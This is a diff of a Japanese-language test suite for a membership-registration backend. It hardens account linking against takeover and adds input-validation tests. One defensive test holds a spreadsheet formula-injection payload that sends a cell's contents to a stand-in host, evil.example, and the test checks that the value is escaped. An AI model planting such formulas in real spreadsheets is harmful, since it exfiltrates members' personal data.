@@ -112,24 +112,34 @@ console.log('\n[2] 名寄せの乗っ取り（今回の修正点）');
   check('aliceのLINE IDが消えていない', sheet._rows[1][0] === 'U_alice', sheet._rows[1][0]);
   check('行が追加されている', sheet._rows.length === 3); }
 
-console.log('\n[3] 名寄せ（本来やりたいこと）は動くか');
+console.log('\n[3] 名寄せ（本来やりたいこと）は動くか：氏名と電話の両方が一致');
 { const rows = [HEADER, ['','5','山田　太郎','ヤマダ　タロウ','','０３１２３４５６７８','','']];  // 紙の会員
   const { ctx, sheet } = makeEnv(rows, OK('U_new'));
   const r = call(ctx, REG);
   check('未連携の紙会員と紐付く', r.memberId === '5', JSON.stringify(r));
   check('LINE IDが書き込まれる', sheet._rows[1][0] === 'U_new');
   check('行は増えない', sheet._rows.length === 2); }
-{ // 電話一致(未連携) と 氏名一致(未連携) が両方ある → 電話を優先
-  const rows = [HEADER,
-    ['','7','佐藤　花子','','','０３１２３４５６７８','',''],   // 電話が一致
-    ['','8','山田　太郎','','','０９０００００００００','','']]; // 氏名が一致
+{ const rows = [HEADER, ['','5','やまだ たろう','','','03-1234-5678','','']];  // 手入力でひらがな・半角
   const { ctx } = makeEnv(rows, OK('U_new'));
+  const r = call(ctx, Object.assign({}, REG, { name:'ヤマダ　タロウ' }));  // フォームはカタカナ・全角で送る
+  check('表記ゆれがあっても名寄せできる', r.memberId === '5', JSON.stringify(r)); }
+
+console.log('\n[3b] 名寄せで他人の紙会員を取り込めないこと');
+{ // 電話番号だけ知っている別人
+  const rows = [HEADER, ['','7','佐藤　花子','','','０３１２３４５６７８','','']];
+  const { ctx, sheet } = makeEnv(rows, OK('U_attacker'));
   const r = call(ctx, REG);
-  check('電話の一致を優先する', r.memberId === '7', JSON.stringify(r)); }
+  check('電話だけ一致では紐付けない', r.memberId !== '7', JSON.stringify(r));
+  check('紙会員のA列は空のまま', sheet._rows[1][0] === ''); }
+{ // 氏名だけ知っている別人
+  const rows = [HEADER, ['','8','山田　太郎','','','０９０００００００００','','']];
+  const { ctx, sheet } = makeEnv(rows, OK('U_attacker'));
+  const r = call(ctx, REG);
+  check('氏名だけ一致では紐付けない', r.memberId !== '8', JSON.stringify(r));
+  check('紙会員のA列は空のまま', sheet._rows[1][0] === ''); }
 { const rows = [HEADER, ['','5','山田　太郎','','','','','']];  // 電話が空欄の紙会員
   const { ctx } = makeEnv(rows, OK('U_new'));
-  const r = call(ctx, REG);
-  check('氏名だけでも名寄せできる', r.memberId === '5'); }
+  check('電話空欄の紙会員は自動で紐付けない', call(ctx, REG).memberId !== '5'); }
 
 console.log('\n[4] 会員番号の採番');
 { const rows = [HEADER, ['U_a','1','A','','','','',''], ['U_b','3','B','','','','','']];
@@ -154,6 +164,25 @@ console.log('\n[6] 入力チェック（サーバー側）');
   check('電話が空なら断る', call(ctx, Object.assign({}, REG, { phone:'' })).status === 'error');
   check('電話が桁数不足なら断る', call(ctx, Object.assign({}, REG, { phone:'１２３' })).status === 'error');
   check('全角の正しい電話は通る', call(ctx, REG).status === 'success'); }
+
+console.log('\n[6b] 数式の埋め込み・異常な入力');
+{ const { ctx, sheet } = makeEnv([HEADER], OK('U1'));
+  const evil = '=IMAGE("https://evil.example/?"&C2)';
+  const r = call(ctx, Object.assign({}, REG, { name: evil, kana: '+1', address: '@x', email: '' }));
+  check('登録自体はできる', r.status === 'success', JSON.stringify(r));
+  const row = sheet._rows[1];
+  check('氏名が数式として書かれない', row[2] === "'" + evil, row[2]);
+  check('+ で始まる値も無害化', row[3] === "'+1", row[3]);
+  check('@ で始まる値も無害化', row[4] === "'@x", row[4]);
+  check('通常の値はそのまま', row[5] === REG.phone, row[5]); }
+{ const { ctx, sheet } = makeEnv([HEADER], OK('U1'));
+  check('長すぎる住所は断る', call(ctx, Object.assign({}, REG, { address: 'あ'.repeat(5000) })).status === 'error');
+  check('文字列でない値は断る', call(ctx, Object.assign({}, REG, { name: { a: 1 } })).status === 'error');
+  check('メール形式が不正なら断る', call(ctx, Object.assign({}, REG, { email: 'not-an-email' })).status === 'error');
+  check('何も書き込まれていない', sheet._rows.length === 1); }
+{ const { ctx } = makeEnv([HEADER], OK('U1'));
+  check('本文が null', JSON.parse(ctx.doPost({ postData:{ contents:'null' } })._t).status === 'unauthorized');
+  check('idTokenが文字列でない', call(ctx, { action:'check', idToken:{ x:1 } }).status === 'unauthorized'); }
 
 console.log('\n[7] 照会');
 { const rows = [HEADER, ['U_me','9','山田　太郎','','','','','']];
